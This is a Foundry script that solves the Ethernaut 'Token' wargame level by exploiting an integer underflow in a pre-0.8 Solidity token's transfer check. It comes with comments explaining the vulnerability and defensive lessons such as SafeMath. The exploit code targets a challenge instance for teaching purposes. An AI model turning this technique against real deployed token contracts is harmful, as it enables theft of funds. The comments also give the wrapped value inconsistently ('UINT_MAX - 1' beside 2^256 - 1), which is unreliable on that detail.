// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "ethernaut/levels/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title TokenSolver
 * @notice Script to solve the Token challenge
 * @dev Run with `forge script script/solutions/TokenSolver.s.sol:TokenSolver --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract TokenSolver is Script {
    // Instance address - replace with your own if needed
    Token public tokenInstance = Token(0x4C07e2918D25887f2C715528D0703cF7C0a6109D);

    function setUp() public {
        // No setup required
    }

    function run() public {
        // Get player address from private key
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        
        console.log("Token instance address:", address(tokenInstance));
        console.log("Player address:", player);
        
        // Check initial token balance
        uint256 initialBalance = tokenInstance.balanceOf(player);
        console.log("Initial token balance:", initialBalance);
        
        vm.startBroadcast(privateKey);

        // Step 1: Exploit the integer underflow by transferring more tokens than we have
        // This will cause an underflow, giving us a very large token balance
        console.log("Step 1: Exploiting integer underflow by transferring tokens...");
        
        // Let's try to transfer one more token than we have (causing an underflow)
        uint256 transferAmount = initialBalance + 1;
        console.log("Transfer amount:", transferAmount);
        
        // We'll transfer to any address (for example, address(1))
        // The key is to exploit the underflow, not where we transfer
        tokenInstance.transfer(address(1), transferAmount);
        
        vm.stopBroadcast();
        
        // Verify the result
        uint256 finalBalance = tokenInstance.balanceOf(player);
        console.log("Final token balance:", finalBalance);
        
        if (finalBalance > initialBalance) {
            console.log("Challenge completed successfully! Token balance increased.");
        } else {
            console.log("Challenge not completed. Token balance did not increase.");
        }
    }
}

/*
 * VULNERABILITY EXPLANATION
 * -----------------------
 * The Token contract has a vulnerability in the transfer function:
 *
 * ```solidity
 * function transfer(address _to, uint256 _value) public returns (bool) {
 *     require(balances[msg.sender] - _value >= 0);
 *     balances[msg.sender] -= _value;
 *     balances[_to] += _value;
 *     return true;
 * }
 * ```
 *
 * The vulnerability is an integer underflow in the transfer function. In Solidity 0.6.0,
 * there is no default protection against overflow/underflow of integer values. The check 
 * `require(balances[msg.sender] - _value >= 0)` is always true for uint256 values because
 * when you subtract a larger value from a smaller uint256, it wraps around to a very large
 * number (2^256 - 1) due to how unsigned integers work.
 *
 * For example, if you have 20 tokens and try to transfer 21:
 * - `20 - 21` underflows to a very large number (UINT_MAX - 1)
 * - This large number is >= 0, so the require check passes
 * - Then `balances[msg.sender] -= _value` sets your balance to UINT_MAX - 1
 *
 * EXPLOIT TECHNIQUE
 * -----------------------
 * 1. We start with 20 tokens (initial balance)
 * 2. We attempt to transfer 21 tokens (more than we have)
 * 3. The check `require(balances[msg.sender] - _value >= 0)` passes because:
 *    - 20 - 21 underflows to 2^256 - 1 (an extremely large number)
 *    - This number is greater than 0, so the condition is true
 * 4. Our balance becomes `20 - 21`, which due to underflow is UINT_MAX - 1
 * 5. We now have an enormous token balance due to the integer underflow
 *
 * SECURITY LESSONS
 * -----------------------
 * 1. Always use safe math libraries (like OpenZeppelin's SafeMath) when working 
 *    with Solidity versions before 0.8.0 to prevent overflow/underflow.
 *
 * 2. Since Solidity 0.8.0, arithmetic operations revert on underflow/overflow by default,
 *    but earlier versions require explicit checks.
 *
 * 3. When implementing token transfers, ensure proper balance checks are in place:
 *    - Use `if (balances[msg.sender] < _value) revert()` instead of subtraction
 *    - Or use SafeMath: `balances[msg.sender] = balances[msg.sender].sub(_value)`
 *
 * 4. Thoroughly test edge cases in financial contracts, especially around arithmetic
 *    operations that might overflow or underflow.
 */ 